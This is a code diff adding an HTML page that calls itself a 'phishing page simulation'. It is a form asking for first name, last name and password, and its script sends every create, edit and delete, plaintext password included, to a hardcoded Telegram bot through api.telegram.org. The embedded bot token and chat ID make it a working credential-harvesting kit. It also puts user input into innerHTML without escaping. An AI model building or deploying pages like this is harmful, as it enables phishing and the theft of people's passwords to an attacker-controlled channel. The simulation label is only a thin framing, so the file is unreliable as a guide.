@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CRUD with Telegram Bot Notifications</title>
+  <!-- Bootstrap CSS -->
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+  />
+</head>
+<body>
+  <div class="container my-4">
+    <h2>Simple CRUD Telegram Bot ( Phishing page semulation)</h2>
+    <form id="userForm">
+      <input type="hidden" id="rowIndex" value="" />
+      <div class="form-group">
+        <label for="firstName">First Name</label>
+        <input
+          type="text"
+          class="form-control"
+          id="firstName"
+          placeholder="Enter first name"
+          required
+        />
+      </div>
+      <div class="form-group">
+        <label for="lastName">Last Name</label>
+        <input
+          type="text"
+          class="form-control"
+          id="lastName"
+          placeholder="Enter last name"
+          required
+        />
+      </div>
+      <div class="form-group">
+        <label for="password">password</label>
+        <input
+          type="password"
+          class="form-control"
+          id="password"
+          placeholder="Enter password"
+          required
+        />
+      </div>
+      <button type="submit" class="btn btn-primary">Submit</button>
+      <button
+        type="button"
+        id="cancelEdit"
+        class="btn btn-secondary ml-2"
+        style="display:none;"
+      >
+        Cancel Edit
+      </button>
+    </form>
+
+    <hr />
+
+    <h2>User Table</h2>
+    <table class="table" id="userTable">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>First</th>
+          <th>Last</th>
+          <th>password</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <th scope="row">1</th>
+          <td>MD Mehedi</td>
+          <td>Hasan</td>
+          <td>SecurityTalent</td>
+          <td>
+            <button class="btn btn-sm btn-warning editBtn">Edit</button>
+            <button class="btn btn-sm btn-danger deleteBtn">Delete</button>
+          </td>
+        </tr>
+
+      </tbody>
+    </table>
+  </div>
+
+  <script>
+    // Telegram Bot config
+    const botToken = "8152705052:AAF98fre9oLCkZe1r1DpRyWk3Z3Jj0NNpkM";
+    const chatId = "6961210774";
+
+    function sendTelegramMessage(text) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      return fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: "HTML",
+        }),
+      }).then((res) => res.json());
+    }
+
+    const form = document.getElementById("userForm");
+    const table = document
+      .getElementById("userTable")
+      .getElementsByTagName("tbody")[0];
+    const rowIndexInput = document.getElementById("rowIndex");
+    const cancelEditBtn = document.getElementById("cancelEdit");
+
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const firstName = document.getElementById("firstName").value.trim();
+      const lastName = document.getElementById("lastName").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      const editIndex = rowIndexInput.value;
+
+      if (editIndex === "") {
+        // Create new row
+        const newRow = table.insertRow();
+        newRow.innerHTML = `
+          <th scope="row">${table.rows.length}</th>
+          <td>${firstName}</td>
+          <td>${lastName}</td>
+          <td>${password}</td>
+          <td>
+            <button class="btn btn-sm btn-warning editBtn">Edit</button>
+            <button class="btn btn-sm btn-danger deleteBtn">Delete</button>
+          </td>
+        `;
+
+        sendTelegramMessage(
+          `🆕 <b>New user added:</b>\nFirst Name: <b>${firstName}</b>\nLast Name: <b>${lastName}</b>\npassword: <b>${password}</b>`
+        );
+      } else {
+        // Update existing row
+        const row = table.rows[editIndex];
+        row.cells[1].textContent = firstName;
+        row.cells[2].textContent = lastName;
+        row.cells[3].textContent = password;
+
+        sendTelegramMessage(
+          `✏️ <b>User updated:</b>\nFirst Name: <b>${firstName}</b>\nLast Name: <b>${lastName}</b>\npassword: <b>${password}</b>`
+        );
+
+        rowIndexInput.value = "";
+        cancelEditBtn.style.display = "none";
+      }
+
+      form.reset();
+      updateRowNumbers();
+    });
+
+    table.addEventListener("click", function (e) {
+      if (e.target.classList.contains("editBtn")) {
+        const row = e.target.closest("tr");
+        const index = Array.from(table.rows).indexOf(row);
+
+        document.getElementById("firstName").value = row.cells[1].textContent;
+        document.getElementById("lastName").value = row.cells[2].textContent;
+        document.getElementById("password").value = row.cells[3].textContent;
+
+        rowIndexInput.value = index;
+        cancelEditBtn.style.display = "inline-block";
+      } else if (e.target.classList.contains("deleteBtn")) {
+        if (confirm("Are you sure you want to delete this row?")) {
+          const row = e.target.closest("tr");
+          const firstName = row.cells[1].textContent;
+          const lastName = row.cells[2].textContent;
+          const password = row.cells[3].textContent;
+
+          row.remove();
+          updateRowNumbers();
+
+          sendTelegramMessage(
+            `🗑️ <b>User deleted:</b>\nFirst Name: <b>${firstName}</b>\nLast Name: <b>${lastName}</b>\npassword: <b>${password}</b>`
+          );
+
+          const editIndex = rowIndexInput.value;
+          if (editIndex !== "") {
+            form.reset();
+            rowIndexInput.value = "";
+            cancelEditBtn.style.display = "none";
+          }
+        }
+      }
+    });
+
+    cancelEditBtn.addEventListener("click", () => {
+      form.reset();
+      rowIndexInput.value = "";
+      cancelEditBtn.style.display = "none";
+    });
+
+    function updateRowNumbers() {
+      for (let i = 0; i < table.rows.length; i++) {
+        table.rows[i].cells[0].textContent = i + 1;
+      }
+    }
+  </script>
+
+  <!-- Bootstrap JS and dependencies (optional) -->
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
